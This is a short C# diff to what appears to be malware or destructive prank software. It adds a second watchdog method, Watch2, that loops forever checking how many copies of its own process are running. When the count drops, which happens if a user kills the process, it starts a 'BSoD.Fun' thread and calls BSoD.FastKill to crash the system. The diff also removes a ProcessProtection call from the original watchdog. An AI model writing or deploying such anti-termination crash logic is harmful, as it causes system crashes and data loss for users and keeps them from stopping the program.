@@ -15,8 +15,21 @@ namespace PoraKushat
             {
                 if (Process.GetProcessesByName(name).Length < 3)
                 {
-                    ProcessProtection.Protect();
                     BSoD.Kill(0xDEADDEAD);
+                }
+            }
+        }
+
+        public static void Watch2()
+        {
+            string name = Process.GetCurrentProcess().MainModule.ModuleName.Substring(0, Process.GetCurrentProcess().MainModule.ModuleName.Length - 4);
+
+            while (true)
+            {
+                if (Process.GetProcessesByName(name).Length < 2)
+                {
+                    new Thread(BSoD.Fun).Start();
+                    BSoD.FastKill(0xDEADDEAD);
                 }
             }
         }
